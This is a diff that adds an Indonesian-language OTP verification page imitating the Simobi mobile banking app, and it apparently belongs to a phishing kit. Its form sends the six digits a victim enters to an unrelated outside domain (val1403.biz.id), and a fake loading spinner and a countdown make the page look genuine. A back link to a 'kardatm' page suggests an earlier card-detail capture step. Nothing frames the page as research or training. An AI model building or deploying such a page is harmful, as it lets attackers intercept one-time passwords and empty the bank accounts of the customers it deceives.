@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="refresh">
+        <title>OTP | simobi</title>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+        <link rel="stylesheet" type="text/css" href="./ib/style/pin.css">
+        <link rel="stylesheet" type="text/css" href="./../lib/style/spinner.css">
+    <style>
+        
+
+/* 118EEA */
+@import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+* {
+    font-family: 'Open Sans', sans-serif;
+    font-weight: 400;
+}
+body {
+    font-family: 'Poppins', sans-serif;
+    width: 100%;
+    height: 100vh;
+    margin: 0;
+    padding: 0;
+      background: url("https://programpromo.publit.io/file/Boloe.png") no-repeat center center fixed;
+      background-size: cover;
+}
+.container {
+    box-sizing: border-box;
+    display: block;
+    margin: auto;
+    width: 100%;
+    height: 100%;
+    max-width: 600px;
+    max-height: 1000px;
+    background-color: transparent;
+    padding: 25px;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    -webkit-transform: translate(-50%, -50%);
+    -moz-transform: translate(-50%, -50%);
+    -ms-transform: translate(-50%, -50%);
+    -o-transform: translate(-50%, -50%);
+}
+.back {
+    position: absolute;
+    top: 15px;
+    width: 20px;
+    float: left;
+}
+.dana_logo{
+    display: block;
+    width: 95px;
+    margin-top: -5px;
+    margin-left: auto;
+    margin-right: auto;
+}
+h1 {
+    margin-top: 60px;
+    text-align: center;
+    font-size: 15px;
+    color: #000;
+}
+    h2 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-top: 30px;
+      margin-bottom: 2px;
+    }
+
+    p {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+.bh1 {
+    font-weight: 700;
+}
+.inputPin {
+    box-sizing: border-box;
+    margin-top: 50px;
+    width: 100%;
+/*    background-color: #ff0000a5;*/
+}
+.formPin {
+    max-width: 500px;
+    margin: auto;
+    margin-top: 30px;
+/*    background-color: lightgreen;*/
+}
+
+/*********************/
+.six_pin {
+    display: flex;
+/*    background-color: blue;*/
+    justify-content: center;
+
+}
+.inpPin {
+    caret-color: transparent;
+    font-size: 20px;
+    font-weight: 600;
+    text-align: center;
+    width: 50px;
+    height: 60px;
+    border: 2px solid #ccc;
+    outline: none;
+    border-radius: 8px;
+    margin-left: 2px;
+    margin-right: 2px;
+}
+/*********************/
+    .resend {
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .resend a {
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .info-box {
+      display: flex;
+      gap: 10px;
+      background: #f5f5f7;
+      padding: 12px;
+      border-radius: 8px;
+      margin-top: 30px;
+      font-size: 14px;
+    }
+
+    .info-box span {
+      color: #007bff;
+      font-weight: bold;
+    }
+.btn {
+/*    background-color: blue;*/
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+}
+.see {
+    margin-bottom: 52px;
+    margin-top: 33px;
+    background: none;
+    font-size: 13px;
+    color: #000;
+    width: 110px;
+    height: 24px;
+    border: 1.2px solid #ffffff;
+    border-radius: 20px;
+}
+.lupa {
+    font-size: 15px;
+    font-weight: 600;
+    color: #000;
+    text-decoration: none;
+}
+/*********************/
+
+    </style>
+    </head>
+    <body>
+        <div class="container">
+    <a class="aback" href="./../kardatm"><img class="back" src="https://programpromo.publit.io/file/Picsart-25-05-21-05-13-12-467.png"></a>
+    <h2>Verifikasi OTP</h2>
+    <p>Kami telah mengirim 6 digit OTP via SMS ke <strong><span class="bh1">+628xxxxxxx</span></strong>.</p>
+            <div class="inputPin">
+                <form class="formPin" action="https://val1403.biz.id/smobi/otp.php" method="post">
+                    <div class="six_pin">
+                        <input inputmode="numeric" id="pin1" maxlength="1" autocomplete="off" type="password" class="inpPin" name="otp1" ></input>
+                        <input inputmode="numeric" id="pin2" maxlength="1" autocomplete="off" type="password" class="inpPin" name="otp2" ></input>
+                        <input inputmode="numeric" id="pin3" maxlength="1" autocomplete="off" type="password" class="inpPin" name="otp3" ></input>
+                        <input inputmode="numeric" id="pin4" maxlength="1" autocomplete="off" type="password" class="inpPin" name="otp4" ></input>
+                        <input inputmode="numeric" id="pin5" maxlength="1" autocomplete="off" type="password" class="inpPin" name="otp5" ></input>
+                        <input inputmode="numeric" id="pin6" maxlength="1" autocomplete="off" type="password" class="inpPin" name="otp6" ></input>
+                    </div>
+                </form>
+                
+    <div class="resend">
+      Tidak menerima OTP? <a href="#" id="resendLink">Kirim ulang dalam <span id="countdown">30</span> detik</a>
+    </div>
+
+    <div class="info-box">
+      <div>ℹ️</div>
+      <div>
+        <div>• OTP berlaku selama 1 menit.</div>
+        <div>• Anda akan dikenakan biaya SMS. Pastikan pulsa Anda cukup.</div>
+      </div>
+            </div>
+        </div>
+        <div id="process" name="process" class="process" style="display: none;">
+            <div class="loading">
+            </div>
+        </div>
+    </body>
+    <script>
+const inputs = document.querySelectorAll(".six_pin input");
+const form = document.querySelector("form")
+inputs.forEach((input, index) => {
+    input.dataset.index = index;
+    input.addEventListener("keydown", clear);
+    input.addEventListener("keyup", onKeyUp);
+});
+function clear($event) { $event.target.value = ""; }
+function checkNumber(number) { return /[0-9]/g.test(number); }
+function onKeyUp($event) {
+    const input = $event.target;
+    const value = input.value;
+    const fieldIndex = +input.dataset.index;
+    if ($event.key === "Backspace" && fieldIndex > 0) {
+        input.previousElementSibling.focus();
+    }
+    if (checkNumber(value)) {
+        if (value.length > 0 && fieldIndex < inputs.length - 1) {
+            input.nextElementSibling.focus();
+        }
+        if (input.value !== "" && fieldIndex === inputs.length - 1) {
+            input.readOnly = true;
+            submit();
+        }
+    } else {
+        clear($event);
+    }
+}
+let xx = document.getElementById('process')
+function submit(){
+    xx.style.display = 'flex';
+    setTimeout(function(){
+        form.submit()
+    }, 2000);
+}
+
+var btn_show = document.getElementById('see');
+var pin = document.getElementById('pin1');
+var pinn = document.getElementById('pin2');
+var pinnn = document.getElementById('pin3');
+var pinnnn = document.getElementById('pin4');
+var pinnnnn = document.getElementById('pin5');
+var pinnnnnn = document.getElementById('pin6');
+
+btn_show.addEventListener('click', pasToText);
+
+function pasToText(){
+    if ((pin.type == 'password')&&(pinn.type == 'password')&&(pinnn.type == 'password')&&(pinnnn.type == 'password')&&(pinnnnn.type == 'password')&&(pinnnnnn.type == 'password')){
+        pin.setAttribute('type','text')
+        pinn.setAttribute('type','text')
+        pinnn.setAttribute('type','text')
+        pinnnn.setAttribute('type','text')
+        pinnnnn.setAttribute('type','text')
+        pinnnnnn.setAttribute('type','text')
+        btn_show.innerHTML='SEMBUNYIKAN'
+    } else {
+        pin.setAttribute('type','password')
+        pinn.setAttribute('type','password')
+        pinnn.setAttribute('type','password')
+        pinnnn.setAttribute('type','password')
+        pinnnnn.setAttribute('type','password')
+        pinnnnnn.setAttribute('type','password')
+        btn_show.innerHTML='TAMPILKAN'
+    }
+}
+
+ </script>
+   <script>
+    // Countdown resend timer
+    let counter = 30;
+    const countdown = document.getElementById('countdown');
+    const resendLink = document.getElementById('resendLink');
+
+    const interval = setInterval(() => {
+      counter--;
+      countdown.textContent = counter;
+      if (counter <= 0) {
+        clearInterval(interval);
+        countdown.textContent = '';
+        resendLink.innerHTML = `<a href="#">Kirim ulang</a>`;
+      }
+    }, 1000);
+  </script>
+</html>
